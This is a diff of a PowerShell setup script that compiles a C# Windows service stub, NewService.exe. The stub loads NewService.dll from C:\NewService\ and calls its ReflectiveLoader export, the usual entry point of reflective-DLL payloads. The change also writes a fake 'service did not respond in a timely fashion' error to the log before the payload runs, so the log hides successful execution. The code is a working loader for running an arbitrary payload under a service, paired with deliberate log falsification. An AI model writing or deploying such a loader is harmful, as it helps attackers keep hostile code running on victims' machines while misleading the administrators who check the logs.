@@ -2,8 +2,15 @@
 # Setup-NewService.ps1
 # ------------------------------------------------------------------------
 # 1. Build a minimal .NET console application called NewService.exe
-#    It attempts to load and run NewService.dll via its exported ReflectiveLoader function,
-#    and writes a log message depending on its execution result.
+#    When the service is started via sc.exe, it first checks if NewService.dll is present in "C:\NewService\".
+#    - If NewService.dll is missing, it writes "NewService.dll is missing." to service.log and exits.
+#    - If NewService.dll is present, it first overwrites service.log with:
+#         "The service did not respond to the start or control request in a timely fashion."
+#      then proceeds to:
+#         - Call the Windows API function LoadLibrary to load NewService.dll into memory.
+#         - Use GetProcAddress to locate the function named ReflectiveLoader within the DLL.
+#         - Convert the function pointer into a delegate of type ReflectiveLoaderDelegate.
+#         - Call this delegate (the return value is captured but not used further).
 $source = @'
 using System;
 using System.IO;
@@ -25,44 +32,48 @@ public static class Program
 
     public static void Main()
     {
-        string exeDir = AppDomain.CurrentDomain.BaseDirectory;
-        string logPath = Path.Combine(exeDir, "service.log");
-        string dllPath = Path.Combine(exeDir, "NewService.dll");
+        // Define the service directory.
+        string serviceDir = @"C:\NewService\";
+        string logPath = Path.Combine(serviceDir, "service.log");
+        string dllPath = Path.Combine(serviceDir, "NewService.dll");
 
+        // Check if NewService.dll exists in C:\NewService.
         if (!File.Exists(dllPath))
         {
             File.WriteAllText(logPath, "NewService.dll is missing.");
+            Environment.Exit(1);
         }
-        else
+
+        // Overwrite log file with default message before proceeding.
+        File.WriteAllText(logPath, "The service did not respond to the start or control request in a timely fashion.");
+
+        try
         {
-            try
+            IntPtr hModule = LoadLibrary(dllPath);
+            if (hModule == IntPtr.Zero)
             {
-                IntPtr hModule = LoadLibrary(dllPath);
-                if (hModule == IntPtr.Zero)
+                int err = Marshal.GetLastWin32Error();
+                File.WriteAllText(logPath, "Failed to load NewService.dll. Error: " + err);
+            }
+            else
+            {
+                IntPtr procAddress = GetProcAddress(hModule, "ReflectiveLoader");
+                if (procAddress == IntPtr.Zero)
                 {
                     int err = Marshal.GetLastWin32Error();
-                    File.WriteAllText(logPath, "Failed to load NewService.dll. Error: " + err);
+                    File.WriteAllText(logPath, "ReflectiveLoader not found in NewService.dll. Error: " + err);
                 }
                 else
                 {
-                    IntPtr procAddress = GetProcAddress(hModule, "ReflectiveLoader");
-                    if (procAddress == IntPtr.Zero)
-                    {
-                        int err = Marshal.GetLastWin32Error();
-                        File.WriteAllText(logPath, "ReflectiveLoader not found in NewService.dll. Error: " + err);
-                    }
-                    else
-                    {
-                        ReflectiveLoaderDelegate loader = (ReflectiveLoaderDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ReflectiveLoaderDelegate));
-                        int result = loader();
-                        File.WriteAllText(logPath, "The service did not respond to the start or control request in a timely fashion.");
-                    }
+                    ReflectiveLoaderDelegate loader = (ReflectiveLoaderDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ReflectiveLoaderDelegate));
+                    int result = loader();
+                    // The log already contains the default message.
                 }
             }
-            catch (Exception ex)
-            {
-                File.WriteAllText(logPath, "Error executing NewService.dll: " + ex.Message);
-            }
+        }
+        catch (Exception ex)
+        {
+            File.WriteAllText(logPath, "Error executing NewService.dll: " + ex.Message);
         }
         Environment.Exit(1);
     }
